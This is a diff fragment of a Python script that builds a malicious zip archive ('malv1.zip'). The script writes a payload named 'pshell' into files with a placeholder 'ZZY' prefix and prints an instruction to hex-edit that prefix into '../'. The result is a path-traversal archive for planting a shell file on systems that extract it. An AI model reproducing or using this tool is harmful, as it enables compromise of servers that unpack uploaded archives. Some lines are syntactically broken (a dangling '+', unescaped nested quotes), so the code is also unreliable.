@@ -18,13 +18,8 @@ for i in range(1,lenght):
   with open(spray*i+file_name,"wb") as f:
     f.write(pshell)
 os.system("zip -0 malv1.zip ZZY*") 
-os.system("zip malv2.zip ZZY*") 
-os.system("rm ZZY*"+file_name+)
-
  
-      
-    
-print("[+] done > malv1.zip - malv2.zip")
+print("[+] done > now go open hex editor and replace "ZZY" by ../")
  
  
   
